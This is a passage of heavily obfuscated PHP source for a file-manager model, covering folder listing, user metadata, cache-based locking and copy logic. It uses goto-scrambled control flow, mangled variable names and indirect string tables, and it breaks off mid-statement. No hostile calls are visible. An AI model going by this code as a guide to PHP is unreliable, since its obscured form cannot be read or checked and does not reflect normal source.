. $CÙÂõºÒ–Ë[47]; if ($dí„—²¥ƒ‚[$CÙÂõºÒ–Ë[366]] == $FœÁ½‰Ø­ï) { $dí„—²¥ƒ‚[$CÙÂõºÒ–Ë[455]] = $CÙÂõºÒ–Ë[466]; $dí„—²¥ƒ‚[$CÙÂõºÒ–Ë[457]] = $CÙÂõºÒ–Ë[464]; $dí„—²¥ƒ‚[$CÙÂõºÒ–Ë[28]] = LNG($CÙÂõºÒ–Ë[465]); } $dí„—²¥ƒ‚[$CÙÂõºÒ–Ë[467]] = $CÙÂõºÒ–Ë[468]; goto EÏÚ‡ÓÍËµ; D»ÊØíö¹: $CÙÂõºÒ–Ë =& $_SERVER[¢à]; if (intval($dí„—²¥ƒ‚[$CÙÂõºÒ–Ë[368]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($FœÁ½‰Ø­ï, $FŒÎÊÂŞŒ) && $dí„—²¥ƒ‚[$CÙÂõºÒ–Ë[366]] != $FœÁ½‰Ø­ï) { return; } goto Fö³‰¯ãÈ«; Fö³‰¯ãÈ«: $D„ ‡‚ËëÔ = explode($CÙÂõºÒ–Ë[8], trim($dí„—²¥ƒ‚[$CÙÂõºÒ–Ë[462]], $CÙÂõºÒ–Ë[8])); $E¢¶Ğ¬Óæï = implode($CÙÂõºÒ–Ë[8], array_slice($D„ ‡‚ËëÔ, 2)); $dí„—²¥ƒ‚[$CÙÂõºÒ–Ë[462]] = $CÙÂõºÒ–Ë[8] . LNG($CÙÂõºÒ–Ë[465]) . $CÙÂõºÒ–Ë[8] . ltrim($E¢¶Ğ¬Óæï, $CÙÂõºÒ–Ë[8]); goto cø·ˆÅƒ÷±; EÏÚ‡ÓÍËµ: } protected function _listAppendPathRoot(&$c£Æ°Ààø¤, $aÆ‚ÄùÏ…ƒ) { $a›óÄœ­èå =& $_SERVER[¢à]; $c­ªÏ‘Ùƒ” = $a›óÄœ­èå[33]; if ($c£Æ°Ààø¤[$a›óÄœ­èå[368]] == self::TYPE_USER) { if (defined($a›óÄœ­èå[423]) && $c£Æ°Ààø¤[$a›óÄœ­èå[452]] == USER_ID) { $c­ªÏ‘Ùƒ” = LNG($a›óÄœ­èå[469]); if (!$aÆ‚ÄùÏ…ƒ) { $c£Æ°Ààø¤[$a›óÄœ­èå[28]] = $c­ªÏ‘Ùƒ”; } } else { $EÌëœè‹ = Model($a›óÄœ­èå[470])->getInfoSimple($c£Æ°Ààø¤[$a›óÄœ­èå[452]]); $c­ªÏ‘Ùƒ” = LNG($a›óÄœ­èå[471]) . $a›óÄœ­èå[154] . $EÌëœè‹[$a›óÄœ­èå[28]] . $a›óÄœ­èå[472]; } } else { if ($c£Æ°Ààø¤[$a›óÄœ­èå[368]] == self::TYPE_GROUP) { $EÌëœè‹ = Model($a›óÄœ­èå[454])->getInfoSimple($c£Æ°Ààø¤[$a›óÄœ­èå[452]]); $c­ªÏ‘Ùƒ” = $EÌëœè‹[$a›óÄœ­èå[28]]; } else { if ($c£Æ°Ààø¤[$a›óÄœ­èå[368]] == self::TYPE_SYSTEM) { $EÌëœè‹ = $this->sourceInfo($aÆ‚ÄùÏ…ƒ[0], !0); $c­ªÏ‘Ùƒ” = $EÌëœè‹[$a›óÄœ­èå[28]]; } } } $c­ªÏ‘Ùƒ” = $c­ªÏ‘Ùƒ” ? $a›óÄœ­èå[8] . $c­ªÏ‘Ùƒ” . $a›óÄœ­èå[8] : $a›óÄœ­èå[8]; return $c­ªÏ‘Ùƒ”; } protected function _listAppendUser(&$dƒŸÒÃˆóµ) { $BÃ˜‰ùæñ =& $_SERVER[¢à]; $cÚÃ»ñÏ¦à = array_to_keyvalue($dƒŸÒÃˆóµ, $BÃ˜‰ùæñ[33], $BÃ˜‰ùæñ[375]); $D¤œõ˜Ä¦š = array_to_keyvalue($dƒŸÒÃˆóµ, $BÃ˜‰ùæñ[33], $BÃ˜‰ùæñ[376]); $AÁ®†‘ïéØ = array_merge($cÚÃ»ñÏ¦à, $D¤œõ˜Ä¦š); $DóœµßÇ¦î = Model($BÃ˜‰ùæñ[473])->userListInfo($AÁ®†‘ïéØ); foreach ($dƒŸÒÃˆóµ as &$B“ÕÄš×É) { $Béè¬…ÀÏ² = $B“ÕÄš×É[$BÃ˜‰ùæñ[375]]; $B“ÕÄš×É[$BÃ˜‰ùæñ[375]] = $DóœµßÇ¦î[$Béè¬…ÀÏ²] ? $DóœµßÇ¦î[$Béè¬…ÀÏ²] : !1; $Béè¬…ÀÏ² = $B“ÕÄš×É[$BÃ˜‰ùæñ[376]]; $B“ÕÄš×É[$BÃ˜‰ùæñ[376]] = $DóœµßÇ¦î[$Béè¬…ÀÏ²] ? $DóœµßÇ¦î[$Béè¬…ÀÏ²] : !1; if (isset($B“ÕÄš×É[$BÃ˜‰ùæñ[413]]) && $B“ÕÄš×É[$BÃ˜‰ùæñ[413]][$BÃ˜‰ùæñ[474]]) { $d˜ƒ®ÊÂ¶Ñ = $GLOBALS[$BÃ˜‰ùæñ[6]][$BÃ˜‰ùæñ[84]][$BÃ˜‰ùæñ[475]]; if ($B“ÕÄš×É[$BÃ˜‰ùæñ[413]][$BÃ˜‰ùæñ[476]] <= time() - $d˜ƒ®ÊÂ¶Ñ) { $this->metaSet($B“ÕÄš×É[$BÃ˜‰ùæñ[366]], $BÃ˜‰ùæñ[474], null); $this->metaSet($B“ÕÄš×É[$BÃ˜‰ùæñ[366]], $BÃ˜‰ùæñ[476], null); unset($B“ÕÄš×É[$BÃ˜‰ùæñ[413]][$BÃ˜‰ùæñ[474]]); continue; } $AŠ¼­î¼‹Ò = $B“ÕÄš×É[$BÃ˜‰ùæñ[413]][$BÃ˜‰ùæñ[474]]; $B“ÕÄš×É[$BÃ˜‰ùæñ[413]][$BÃ˜‰ùæñ[477]] = Model($BÃ˜‰ùæñ[473])->getInfoSimpleOuter($AŠ¼­î¼‹Ò); } } } public function parentLevelArray($dª³ÃÀÑ…¸) { $BØ¤¡á“«Ö =& $_SERVER[¢à]; $dª³ÃÀÑ…¸ = explode($BØ¤¡á“«Ö[47], trim($dª³ÃÀÑ…¸, $BØ¤¡á“«Ö[47])); return array_remove_value($dª³ÃÀÑ…¸, $BØ¤¡á“«Ö[464]); } public function listAll($c‚áïÇÔ´²) { goto dµ·•¦ĞÌ‘; CÏÜˆô°ƒ: $Aí¥ÀŠ¹Äİ = array(); foreach ($bÕÒ˜¸Ó»Ø as $CŠŒ—¨ôÁ“ => $CÂ¾Íˆ™¯Æ) { goto CŒ¶õ­£œ‚; C¥Ğî§Ìø‘: for ($Aº‹åöé–ì = 0; $Aº‹åöé–ì < count($a¨  ³×”); $Aº‹åöé–ì++) { $då™–‘´ñã .= $bÕÒ˜¸Ó»Ø[$a¨  ³×”[$Aº‹åöé–ì]][$Eâ›…„ÏËâ[28]] . $Eâ›…„ÏËâ[8]; } $då™–‘´ñã .= $CÂ¾Íˆ™¯Æ[$Eâ›…„ÏËâ[28]]; if ($CÂ¾Íˆ™¯Æ[$Eâ›…„ÏËâ[367]]) { $då™–‘´ñã .= $Eâ›…„ÏËâ[8]; } goto DÉ‘Ğòõƒ; CŒ¶õ­£œ‚: $a¨  ³×” = $this->parentLevelArray($CÂ¾Íˆ™¯Æ[$Eâ›…„ÏËâ[455]]); array_shift($a¨  ³×”); $då™–‘´ñã = $c¡£ËÏ¯Ú½; goto C¥Ğî§Ìø‘; BÌòñÄ¿ÇÖ: if (!$CÂ¾Íˆ™¯Æ[$Eâ›…„ÏËâ[367]]) { $D³èÚæ„ˆ[$Eâ›…„ÏËâ[415]] = $CÂ¾Íˆ™¯Æ[$Eâ›…„ÏËâ[415]]; $D³èÚæ„ˆ[$Eâ›…„ÏËâ[485]] = $CÂ¾Íˆ™¯Æ[$Eâ›…„ÏËâ[75]]; } $Aí¥ÀŠ¹Äİ[] = $D³èÚæ„ˆ; goto eØàè™Ÿë; DÉ‘Ğòõƒ: $då™–‘´ñã = str_replace($Eâ›…„ÏËâ[463], $Eâ›…„ÏËâ[8], $då™–‘´ñã); $då™–‘´ñã = str_replace($Eâ›…„ÏËâ[463], $Eâ›…„ÏËâ[8], $då™–‘´ñã); $D³èÚæ„ˆ = array($Eâ›…„ÏËâ[384] => str_replace($Eâ›…„ÏËâ[463], $Eâ›…„ÏËâ[8], $då™–‘´ñã), $Eâ›…„ÏËâ[484] => intval($CÂ¾Íˆ™¯Æ[$Eâ›…„ÏËâ[367]]), $Eâ›…„ÏËâ[388] => $this->pathInfoFilter($CÂ¾Íˆ™¯Æ, !0)); goto BÌòñÄ¿ÇÖ; eØàè™Ÿë: } return $Aí¥ÀŠ¹Äİ; goto eèïÏ¿Ü©Ğ; F™°•êÚ˜õ: $this->_listAppendAuth($bÕÒ˜¸Ó»Ø); $this->_listAppendUser($bÕÒ˜¸Ó»Ø); $this->_listAppendPath($bÕÒ˜¸Ó»Ø); goto Eò²²—Ş‘; eÌ‘•İÊ: $D¡ÁÚ¾¢±½ = $Eâ›…„ÏËâ[482]; $c®“ĞÏœÕŠ = "\x4c\x45\x46\x54\40\x4a\x4f\x49\116\x20{$this->tablePrefix}\x69\x6f\137\x66\x69\154\145\40\x66\151\x6c\145\40\x6f\156\x20\x73\x6f\x75\162\143\x65\56\x66\151\x6c\x65\x49\x44\x20\75\x20\x66\x69\154\x65\x2e\x66\x69\x6c\145\111\x44"; $bÕÒ˜¸Ó»Ø = $this->alias($Eâ›…„ÏËâ[483])->field($D¡ÁÚ¾¢±½)->where($f‡ í‰ä®–)->join($c®“ĞÏœÕŠ)->select(); goto F™°•êÚ˜õ; dµ·•¦ĞÌ‘: $Eâ›…„ÏËâ =& $_SERVER[¢à]; $B‘ø¸«²® = $this->sourceInfo($c‚áïÇÔ´²); $f‡ í‰ä®– = array($Eâ›…„ÏËâ[478] => array($Eâ›…„ÏËâ[479], $B‘ø¸«²®[$Eâ›…„ÏËâ[455]] . $c‚áïÇÔ´² . $Eâ›…„ÏËâ[480]), $Eâ›…„ÏËâ[481] => 0); goto eÌ‘•İÊ; Eò²²—Ş‘: $bÕÒ˜¸Ó»Ø = array_to_keyvalue($bÕÒ˜¸Ó»Ø, $Eâ›…„ÏËâ[366]); $c¡£ËÏ¯Ú½ = "\x2f{$B‘ø¸«²®[$Eâ›…„ÏËâ[28]]}\x2f"; $c¡£ËÏ¯Ú½ = $c¡£ËÏ¯Ú½ == $Eâ›…„ÏËâ[463] ? $Eâ›…„ÏËâ[8] : $c¡£ËÏ¯Ú½; goto CÏÜˆô°ƒ; eèïÏ¿Ü©Ğ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($EÅŸÚ¥õÄ®) { goto B¬²‡ÏÛê¿; B¬²‡ÏÛê¿: $A‡†§‘Å =& $_SERVER[¢à]; if (!$this->allowLock()) { return; } $this->_lockCheck($A‡†§‘Å[486], $EÅŸÚ¥õÄ®); goto Açé¯ŸÁÍˆ; B‡²í¡½§å: $this->_lockEvent($EÅŸÚ¥õÄ®, array($A‡†§‘Å[489], $A‡†§‘Å[490]), $CôÈŠ”ÄŒÑ); $this->_lockCheckEnd($A‡†§‘Å[486], $EÅŸÚ¥õÄ®); goto C¿¥¦œŞˆ; Açé¯ŸÁÍˆ: $CôÈŠ”ÄŒÑ = 1; $this->_lockEvent($EÅŸÚ¥õÄ®, array($A‡†§‘Å[487], $A‡†§‘Å[488]), $CôÈŠ”ÄŒÑ); $this->_lockParent($EÅŸÚ¥õÄ®, array($A‡†§‘Å[488]), $CôÈŠ”ÄŒÑ); goto B‡²í¡½§å; C¿¥¦œŞˆ: } public function lockCopyEnd($c¡æÉõçè) { $A„á«ÃÒè¿ =& $_SERVER[¢à]; if (!$this->allowLock()) { return; } $fáêÓ‡Ùô° = 0; $this->_lockEvent($c¡æÉõçè, array($A„á«ÃÒè¿[487], $A„á«ÃÒè¿[488]), $fáêÓ‡Ùô°); $this->_lockParent($c¡æÉõçè, array($A„á«ÃÒè¿[488]), $fáêÓ‡Ùô°); $this->_lockEvent($c¡æÉõçè, array($A„á«ÃÒè¿[489], $A„á«ÃÒè¿[490]), $fáêÓ‡Ùô°); } public function lockWriteStart($A¨Í’‡æ, $BÚƒÏ¶æÚÒ = '') { goto C®®•Ú–ê; fõ˜å«­–: $câ²× ¯åÄ = 1; $this->_lockKey($aº÷Ğ–±Îñ[491] . $A¨Í’‡æ . $aº÷Ğ–±Îñ[93] . $BÚƒÏ¶æÚÒ, $câ²× ¯åÄ); $this->_lockEvent($A¨Í’‡æ, array($aº÷Ğ–±Îñ[486], $aº÷Ğ–±Îñ[488]), $câ²× ¯åÄ); goto FŞæ´¨Ôå±; C®®•Ú–ê: $aº÷Ğ–±Îñ =& $_SERVER[¢à]; if (!$this->allowLock()) { return; } $this->_lockCheck($aº÷Ğ–±Îñ[487], $A¨Í’‡æ); goto fõ˜å«­–; FŞæ´¨Ôå±: $this->_lockParent($A¨Í’‡æ, array($aº÷Ğ–±Îñ[486], $aº÷Ğ–±Îñ[488]), $câ²× ¯åÄ); $this->_lockCheckEnd($aº÷Ğ–±Îñ[487], $A¨Í’‡æ); goto CòìÎÌœÅ; CòìÎÌœÅ: } public function lockWriteEnd($Cë ßÑÜÔ, $BÔãš’Ìï = '') { $E‘…´âîÆª =& $_SERVER[¢à]; if (!$this->allowLock()) { return; } $B§Í‡¿†í³ = 0; $this->_lockKey($E‘…´âîÆª[491] . $Cë ßÑÜÔ . $E‘…´âîÆª[93] . $BÔãš’Ìï, $B§Í‡¿†í³); $this->_lockEvent($Cë ßÑÜÔ, array($E‘…´âîÆª[486], $E‘…´âîÆª[488]), $B§Í‡¿†í³); $this->_lockParent($Cë ßÑÜÔ, array($E‘…´âîÆª[486], $E‘…´âîÆª[488]), $B§Í‡¿†í³); } public function lockMoveStart($F¤½‘ÛÖ±‘) { goto cĞ«¬ù Ÿ; FÈà—Øïâ®: $D„Õ‹š…ğ… = 1; $this->_lockKey($C‰Ìö©§ñ¾[492] . $F¤½‘ÛÖ±‘, $D„Õ‹š…ğ…); $this->_lockEvent($F¤½‘ÛÖ±‘, array($C‰Ìö©§ñ¾[486], $C‰Ìö©§ñ¾[487]), $D„Õ‹š…ğ…); goto eçÊƒì‘õ¯; eçÊƒì‘õ¯: $this->_lockParent($F¤½‘ÛÖ±‘, array($C‰Ìö©§ñ¾[486], $C‰Ìö©§ñ¾[488]), $D„Õ‹š…ğ…); $this->_lockEvent($F¤½‘ÛÖ±‘, array($C‰Ìö©§ñ¾[493], $C‰Ìö©§ñ¾[489], $C‰Ìö©§ñ¾[490]), $D„Õ‹š…ğ…); $this->_lockCheckEnd($C‰Ìö©§ñ¾[488], $F¤½‘ÛÖ±‘); goto AÓïï˜½; cĞ«¬ù Ÿ: $C‰Ìö©§ñ¾ =& $_SERVER[¢à]; if (!$this->allowLock()) { return; } $this->_lockCheck($C‰Ìö©§ñ¾[488], $F¤½‘ÛÖ±‘); goto FÈà—Øïâ®; AÓïï˜½: } public function lockMoveEnd($D¤ÃØ§‡¼È) { goto f’š‡¶±õĞ; fŠ‡ÇÅÊÌÜ: $this->_lockEvent($D¤ÃØ§‡¼È, array($E‚—µ¢”»ó[493], $E‚—µ¢”»ó[489], $E‚—µ¢”»ó[490]), $CŞĞó‚µŸ); goto CÃ¯İ°Û¥ç; fÛ’…¥Ô‚ë: $this->_lockKey($E‚—µ¢”»ó[492] . $D¤ÃØ§‡¼È, $CŞĞó‚µŸ); $this->_lockEvent($D¤ÃØ§‡¼È, array($E‚—µ¢”»ó[486], $E‚—µ¢”»ó[487]), $CŞĞó‚µŸ); $this->_lockParent($D¤ÃØ§‡¼È, array($E‚—µ¢”»ó[486], $E‚—µ¢”»ó[488]), $CŞĞó‚µŸ); goto fŠ‡ÇÅÊÌÜ; f’š‡¶±õĞ: $E‚—µ¢”»ó =& $_SERVER[¢à]; if (!$this->allowLock()) { return; } $CŞĞó‚µŸ = 0; goto fÛ’…¥Ô‚ë; CÃ¯İ°Û¥ç: } private function _lockCheck($D¯ºø’¤›„, $Bº×íÍ¦ŒŠ) { goto E††¿Ìİ¤Ì; Bß£½åÂ·³: CacheLock::setErrorMsg($eÇ¡Õ²£®ö[154] . htmlspecialchars($DÒËäÇİ[$eÇ¡Õ²£®ö[28]]) . $eÇ¡Õ²£®ö[472] . $b¨ßƒâÏ‹«); $this->_lockKey($aÉª÷Òğ©À, 1); $this->_lockKey($aÉª÷Òğ©À, 0); goto bÇ·¹ßØ¦­; bÇ·¹ßØ¦­: $cÖÌ§å˜‹é = array_reverse($this->parentLevelArray($DÒËäÇİ[$eÇ¡Õ²£®ö[455]])); foreach ($cÖÌ§å˜‹é as $cŠÃëÆÍ¬˜) { $aÉª÷Òğ©À = $D¯ºø’¤›„ . $eÇ¡Õ²£®ö[495] . $cŠÃëÆÍ¬˜; if (CacheLock::lockGet($eÇ¡Õ²£®ö[496] . $aÉª÷Òğ©À)) { $DÒËäÇİ = $this->sourceInfo($cŠÃëÆÍ¬˜); CacheLock::setErrorMsg($eÇ¡Õ²£®ö[154] . htmlspecialchars($DÒËäÇİ[$eÇ¡Õ²£®ö[28]]) . $eÇ¡Õ²£®ö[472] . $b¨ßƒâÏ‹«); $this->_lockKey($aÉª÷Òğ©À, 1); $this->_lockKey($aÉª÷Òğ©À, 0); } } goto C¢È›ˆï‹Ã; E††¿Ìİ¤Ì: $eÇ¡Õ²£®ö =& $_SERVER[¢à]; $DÒËäÇİ = $this->sourceInfo($Bº×íÍ¦ŒŠ); $aÉª÷Òğ©À = $D¯ºø’¤›„ . $eÇ¡Õ²£®ö[93] . $Bº×íÍ¦ŒŠ; goto f‡à‡§ë¬‰; f‡à‡§ë¬‰: $this->_lockTimeStart[$aÉª÷Òğ©À] = timeFloat(); if (!is_array($DÒËäÇİ)) { return; } $b¨ßƒâÏ‹« = LNG($eÇ¡Õ²£®ö[494]); goto Bß£½åÂ·³; C¢È›ˆï‹Ã: } private function _lockCheckEnd($dÛĞ³ù§¡, $ešÀ‹ë¯Œ) { goto E‡ùÂ°˜°Ô; aãœÌ®Çó: if (!isset($this->_lockTimeStart[$Eíº¥†”¯])) { return; } $dŸà§¿ªŠŠ = timeFloat() - $this->_lockTimeStart[$Eíº¥†”¯]; unset($this->_lockTimeStart[$Eíº¥†”¯]); goto D»Â±˜ ö; D»Â±˜ ö: if ($dŸà§¿ªŠŠ > 0.5) { unset(self::$cacheSourceInfo[$fÓ¦ĞÂÇ[406] . $ešÀ‹ë¯Œ]); } $FÈçï×³—â = $this->sourceInfo($ešÀ‹ë¯Œ); if (!$FÈçï×³—â) { show_json(LNG($fÓ¦ĞÂÇ[102]), !1); } goto C‘ÒñË—Á; E‡ùÂ°˜°Ô: $fÓ¦ĞÂÇ =& $_SERVER[¢à]; $Eíº¥†”¯ = $dÛĞ³ù§¡ . $fÓ¦ĞÂÇ[93] . $ešÀ‹ë¯Œ; CacheLock::setErrorMsg($fÓ¦ĞÂÇ[358]); goto aãœÌ®Çó; C‘ÒñË—Á: } private function _lockParent($aÙ ÏÂ¯±å, $CÄÃ¤ÖùÃ™, $d³±³Â•Š) { if (!$this->autoLockSet) { return; } $eÅˆ™Ã‘âÕ = $this->sourceInfo($aÙ ÏÂ¯±å); if (!is_array($eÅˆ™Ã‘âÕ)) { return; } $d·››‰¡šç = array_reverse($this->parentLevelArray($eÅˆ™Ã‘âÕ[$_SERVER[¢à][455]])); foreach ($d·››‰¡šç as $cØªçÉ¯) { $this->_lockEvent($cØªçÉ¯, $CÄÃ¤ÖùÃ™, $d³±³Â•Š); } } private function _lockEvent($FËè–ì¨Ö, $C§À–ÂË¢ , $DôãŒ³Ù¼) { $aÕğ‚Ôé¿ =& $_SERVER[¢à]; if (!$this->autoLockSet) { return; } foreach ($C§À–ÂË¢  as $bæÍÊíÇ¼) { $B²ìØù¡ª„ = $bæÍÊíÇ¼ . $aÕğ‚Ôé¿[93] . $FËè–ì¨Ö; if ($DôãŒ³Ù¼ && CacheLock::lockGet($aÕğ‚Ôé¿[496] . $B²ìØù¡ª„)) { continue; } $this->_lockKey($B²ìØù¡ª„, $DôãŒ³Ù¼); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($b­Íß«¥î«, $aí¦İæßÚ‰ = 1) { $bì£¥õ™øÚ = $_SERVER[¢à][496] . md5($b­Íß«¥î«); if ($aí¦İæßÚ‰) { if (isset(self::$_lockItemArr[$bì£¥õ™øÚ])) { return; } self::$_lockItemArr[$bì£¥õ™øÚ] = 1; CacheLock::lock($bì£¥õ™øÚ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$bì£¥õ™øÚ])) { return; } unset(self::$_lockItemArr[$bì£¥õ™øÚ]); CacheLock::unlock($bì£¥õ™øÚ); } } public function isParentOf($DáİàçÏæ, $d©È¯ìĞÎÛ) { goto bÁãâ·Ÿöƒ; c‚Ô¡«éŠ¸: $A”“éÉÂÄ‰ = $A°÷“‘ƒ½Ë[$e¡¹¹Âª¸í[455]] . $A°÷“‘ƒ½Ë[$e¡¹¹Âª¸í[366]] . $e¡¹¹Âª¸í[47]; $d’Ñ”‚è”Ö = $BÙœ÷ƒ¬Ş[$e¡¹¹Âª¸í[455]] . $BÙœ÷ƒ¬Ş[$e¡¹¹Âª¸í[366]] . $e¡¹¹Âª¸í[47]; $f…ñöĞ÷À = strpos($d’Ñ”‚è”Ö, $A”“éÉÂÄ‰) === 0; goto b·…ÊÂï¸­; b·…ÊÂï¸­: return $f…ñöĞ÷À; goto FØœ¬Š…ê; bÁãâ·Ÿöƒ: $e¡¹¹Âª¸í =& $_SERVER[¢à]; $A°÷“‘ƒ½Ë = $this->sourceInfo($DáİàçÏæ); $BÙœ÷ƒ¬Ş = $this->sourceInfo($d©È¯ìĞÎÛ); goto c‚Ô¡«éŠ¸; FØœ¬Š…ê: } private $targetIsDelete = 0; public function copy($aÖº¥´æØñ, $C÷—³‹¶¸å, $fĞ‡ßÊ ¬ = REPEAT_REPLACE, $fÓİáŞÂö = '') { goto FÉìœµšŒá; B¹¯ªøˆ: $this->targetIsDelete = intval($e“ò”×Œ–è[$aà‚Äçİö[393]]); $F¦È‚ÙÓğ» = $this->fileNameExistCache($C÷—³‹¶¸å, $e“ò”×Œ–è[$aà‚Äçİö[28]]); $FŠÒÇàĞö = $this->_copy($aÖº¥´æØñ, $C÷—³‹¶¸å, $fĞ‡ßÊ ¬, $e×á†Øì, !0, $fÓİáŞÂö); goto C«ƒ›—†øÒ; e¸»“ˆ±‘°: $this->lockCopyStart($aÖº¥´æØñ); $this->lockWriteStart($C÷—³‹¶¸å, $b±Ò¡‹©±ë); $e×á†Øì = array($aà‚Äçİö[497] => array(), $aà‚Äçİö[498] => array(), $aà‚Äçİö[499] => array()); goto B¹¯ªøˆ; b¢™ê±ï: $this->updateModifyTime($C÷—³‹¶¸å); return $FŠÒÇàĞö; goto aù–ğµ÷¢È; E•ŠŒÄ±ìé: $this->saveAll($e×á†Øì[$aà‚Äçİö[499]]); Model($aà‚Äçİö[164])->linkAdd($e×á†Øì[$aà‚Äçİö[497]]); $this->folderSizeReset($C÷—³‹¶¸å); goto b¢™ê±ï; bÅï¡ØëàÜ: if (!$e“ò”×Œ–è || !$d‘ä¿â…‚¯ || $d‘ä¿â…‚¯[$aà‚Äçİö[367]] != $aà‚Äçİö[83]) { return !1; } if ($this->isParentOf($aÖº¥´æØñ, $C÷—³‹¶¸å)) { return !1; } $b±Ò¡‹©±ë = $fÓİáŞÂö ? $fÓİáŞÂö : $e“ò”×Œ–è[$aà‚Äçİö[28]]; goto e¸»“ˆ±‘°; C«ƒ›—†øÒ: $this->_childrenListClear(); $this->lockCopyEnd($aÖº¥´æØñ); $this->lockWriteEnd($C÷—³‹¶¸å, $b±Ò¡‹©±ë); goto c—¶È×Ñ•º; c—¶È×Ñ•º: if ($e“ò”×Œ–è[$aà‚Äçİö[367]] == $aà‚Äçİö[83] && $F¦È‚ÙÓğ» == $FŠÒÇàĞö) { $this->folderSizeResetChildren($F¦È‚ÙÓğ»); } Model($aà‚Äçİö[500])->addAll($e×á†Øì[$aà‚Äçİö[498]], array(), !0); if ($F¦È‚ÙÓğ» != $FŠÒÇàĞö || $e“ò”×Œ–è[$aà‚Äçİö[367]] == $aà‚Äçİö[83]) { Model($aà‚Äçİö[501])->eventCopy($FŠÒÇàĞö); } goto E•ŠŒÄ±ìé; FÉìœµšŒá: $aà‚Äçİö =& $_SERVER[¢à]; $e“ò”×Œ–è = $this->sourceInfo($aÖº¥´æØñ); $d‘ä¿â…‚¯ = $this->sourceInfo($C÷—³‹¶¸å); goto bÅï¡ØëàÜ; aù–ğµ÷¢È: } private function _copy($Fº™ïî©ßÀ, $Bä‚À²‚ğÙ, $f‚‘ÈÂÆ†, &$aå…èÄ¢ß†, $C¸âöñß¬Ê, $eÚİ½É“±ß = '') { goto DéèÄ†Ï„“; e†ïò°Ğª: return $aâá†¡ù; goto FĞ‘¯Ã¢àÛ; e–÷ˆ‹­äˆ: if (!$EÎ¦¶•µ¸) { return $this->_copyCreate($Fº™ïî©ßÀ, $Bä‚À²‚ğÙ, $A‹İ²Ã“èµ, $aå…èÄ¢ß†); } $aâá†¡ù = $EÎ¦¶•µ¸; if ($e§æ®š­Õ) { if ($f‚‘ÈÂÆ† == REPEAT_RENAME_FOLDER) { $A‹İ²Ã“èµ = $this->fileNameAutoCache($Bä‚À²‚ğÙ, $A‹İ²Ã“èµ, $f‚‘ÈÂÆ†, $e§æ®š­Õ); $aâá†¡ù = $this->_copyCreate($Fº™ïî©ßÀ, $Bä‚À²‚ğÙ, $A‹İ²Ã“èµ, $aå…èÄ¢ß†); } else { $b¾ˆ ëÛ = $this->_childrenList($Fº™ïî©ßÀ); foreach ($b¾ˆ ëÛ as $e¤”Œö”Ã) { $this->_copy($e¤”Œö”Ã[$Dì¬îØèê©[366]], $EÎ¦¶•µ¸, $f‚‘ÈÂÆ†, $aå…èÄ¢ß†, !1); } } } else { if ($f‚‘ÈÂÆ† == REPEAT_RENAME || $f‚‘ÈÂÆ† == REPEAT_RENAME_FOLDER) { $A‹İ²Ã“èµ = $this->fileNameAutoCache($Bä‚À²‚ğÙ, $A‹İ²Ã“èµ, $f‚‘ÈÂÆ†, $e§æ®š­Õ); $aâá†¡ù = $this->_copyCreate($Fº™ïî©ßÀ, $Bä‚À²‚ğÙ, $A‹İ²Ã“èµ, $aå…èÄ¢ß†); } else { if ($f‚‘ÈÂÆ† == REPEAT_REPLACE) { $DŒº“¯»«Ò = $this->sourceInfoCache($EÎ¦¶•µ¸); $e‹êˆé± = $this->fileHistory($DŒº“¯»«Ò, $f²‹‹„Á†î[$Dì¬îØèê©[415]], $f²‹‹„Á†î[$Dì¬îØèê©[77]]); if ($e‹êˆé±) { $aå…èÄ¢ß†[$Dì¬îØèê©[497]][] = $f²‹‹„Á†î[$Dì¬îØèê©[415]]; } } else { if ($f‚‘ÈÂÆ† == REPEAT_SKIP) { } } } Hook::trigger($Dì¬îØèê©[502], array($Dì¬îØèê©[503], $f²‹‹„Á†î, 0)); } goto e†ïò°Ğª; Bç‡”á‰–: $A‹İ²Ã“èµ = $eÚİ½É“±ß ? $eÚİ½É“±ß : $f²‹‹„Á†î[$Dì¬îØèê©[28]]; $EÎ¦¶•µ¸ = $this->fileNameExistCache($Bä‚À²‚ğÙ, $A‹İ²Ã“èµ); if ($C¸âöñß¬Ê) { $this->_childrenAllMake($Fº™ïî©ßÀ); if ($e§æ®š­Õ && $EÎ¦¶•µ¸) { $this->_childrenAllMake($EÎ¦¶•µ¸); } } goto e–÷ˆ‹­äˆ; DéèÄ†Ï„“: $Dì¬îØèê© =& $_SERVER[¢à]; $f²‹‹„Á†î = $this->sourceInfoCache($Fº™ïî©ßÀ); $e§æ®š­Õ = $f²‹‹„Á†î[$Dì¬îØèê©[367]] == $Dì¬îØèê©[83]; goto Bç‡”á‰–; FĞ‘¯Ã¢àÛ: } private function _copyCreate($A¿Á‚ÅÂ‡¦, $D¸‡¶ÚŒà, $B‰‘ĞÀšÙ™, &$béŠ«“×ì) { goto Fª„ĞËÚƒ; BÕ‚Ìâ›ó: $this->_childrenListAll($A¿Á‚ÅÂ‡¦, $B«›ªÂº™±); $Cç­œÅ®¦Ï = count($B«›ªÂº™±); if ($Cç­œÅ®¦Ï == 0) { return $e„¸…ÙŒ¸„; } goto dåØ«×ë½; fİÑÀÇøÊŸ: $aéµá·¾Ã”[$A¿Á‚ÅÂ‡¦] = $e„¸…ÙŒ¸„; $F¸”Ÿ½” = array(); $a—è–¹ì°Ğ = array(); goto bÑªóåëƒ; Fª„ĞËÚƒ: $CçÒ‹ãî²Ï =& $_SERVER[¢à]; $D‡ôÊğä¾ = $this->sourceInfoCache($A¿Á‚ÅÂ‡¦); $có³ªëá½ = $this->sourceInfoCache($D¸‡¶ÚŒà); goto e£‰‰‚æ¼Æ; eõÁ°×êêÇ: if ($D‡ôÊğä¾[$CçÒ‹ãî²Ï[367]] != $CçÒ‹ãî²Ï[83]) { $béŠ«“×ì[$CçÒ‹ãî²Ï[497]][] = $D‡ôÊğä¾[$CçÒ‹ãî²Ï[415]]; return $e„¸…ÙŒ¸„; } $B«›ªÂº™± = array(); $AäÀÉ’«ƒç = array(); goto BÕ‚Ìâ›ó; eò˜ŠŠ¼øÈ: $this->addAll($AäÀÉ’«ƒç, array(), !1); $BßÚœß‹ = $this->where(array($CçÒ‹ãî²Ï[457] => $e„¸…ÙŒ¸„))->select(); $aéµá·¾Ã” = $this->_childrenMakeRelation($B«›ªÂº™±, $BßÚœß‹); goto fİÑÀÇøÊŸ; bÑªóåëƒ: foreach ($BßÚœß‹ as 